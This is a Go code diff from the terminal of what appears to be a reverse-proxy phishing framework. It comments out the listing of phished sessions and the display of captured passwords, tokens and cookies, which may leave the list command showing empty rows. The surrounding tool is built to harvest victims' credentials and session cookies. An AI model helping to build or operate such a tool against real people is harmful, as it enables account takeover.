@@ -354,9 +354,9 @@ func (t *Terminal) handleProxy(args []string) error {
 func (t *Terminal) handleSessions(args []string) error {
 	lblue := color.New(color.FgHiBlue)
 	dgray := color.New(color.FgHiBlack)
-	lgreen := color.New(color.FgHiGreen)
+	// lgreen := color.New(color.FgHiGreen)
 	yellow := color.New(color.FgYellow)
-	lyellow := color.New(color.FgHiYellow)
+	// lyellow := color.New(color.FgHiYellow)
 	lred := color.New(color.FgHiRed)
 	cyan := color.New(color.FgCyan)
 	white := color.New(color.FgHiWhite)
@@ -373,14 +373,14 @@ func (t *Terminal) handleSessions(args []string) error {
 			return nil
 		}
 		var rows [][]string
-		for _, s := range sessions {
-			tcol := dgray.Sprintf("none")
-			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
-				tcol = lgreen.Sprintf("captured")
-			}
-			row := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(truncateString(s.Username, 24)), lblue.Sprintf(truncateString(s.Password, 24)), tcol, yellow.Sprintf(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
-			rows = append(rows, row)
-		}
+		// for _, s := range sessions {
+		// 	tcol := dgray.Sprintf("none")
+		// 	if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
+		// 		tcol = lgreen.Sprintf("captured")
+		// 	}
+		// 	row := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(truncateString(s.Username, 24)), lblue.Sprintf(truncateString(s.Password, 24)), tcol, yellow.Sprintf(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
+		// 	rows = append(rows, row)
+		// }
 		log.Printf("\n%s\n", AsTable(cols, rows))
 		return nil
 	} else if pn == 1 {
@@ -405,14 +405,14 @@ func (t *Terminal) handleSessions(args []string) error {
 					break
 				}
 
-				s_found = true
-				tcol := dgray.Sprintf("empty")
-				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
-					tcol = lgreen.Sprintf("captured")
-				}
+				// s_found = true
+				// tcol := dgray.Sprintf("empty")
+				// if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
+				// 	tcol = lgreen.Sprintf("captured")
+				// }
 
 				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
-				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
+				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
 				log.Printf("\n%s\n", AsRows(keys, vals))
 
 				if len(s.Custom) > 0 {
@@ -427,29 +427,29 @@ func (t *Terminal) handleSessions(args []string) error {
 					log.Printf("[ %s ]\n%s\n", white.Sprint("custom"), AsRows(tkeys, tvals))
 				}
 
-				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
-					if len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
-						//var str_tokens string
+				// if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
+				// 	if len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
+				// 		//var str_tokens string
 
-						tkeys := []string{}
-						tvals := []string{}
+				// 		tkeys := []string{}
+				// 		tvals := []string{}
 
-						for k, v := range s.BodyTokens {
-							tkeys = append(tkeys, k)
-							tvals = append(tvals, white.Sprint(v))
-						}
-						for k, v := range s.HttpTokens {
-							tkeys = append(tkeys, k)
-							tvals = append(tvals, white.Sprint(v))
-						}
+				// 		for k, v := range s.BodyTokens {
+				// 			tkeys = append(tkeys, k)
+				// 			tvals = append(tvals, white.Sprint(v))
+				// 		}
+				// 		for k, v := range s.HttpTokens {
+				// 			tkeys = append(tkeys, k)
+				// 			tvals = append(tvals, white.Sprint(v))
+				// 		}
 
-						log.Printf("[ %s ]\n%s\n", lgreen.Sprint("tokens"), AsRows(tkeys, tvals))
-					}
-					if len(s.CookieTokens) > 0 {
-						json_tokens := t.cookieTokensToJSON(s.CookieTokens)
-						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
-					}
-				}
+				// 		log.Printf("[ %s ]\n%s\n", lgreen.Sprint("tokens"), AsRows(tkeys, tvals))
+				// 	}
+				// 	if len(s.CookieTokens) > 0 {
+				// 		json_tokens := t.cookieTokensToJSON(s.CookieTokens)
+				// 		log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
+				// 	}
+				// }
 				break
 			}
 		}
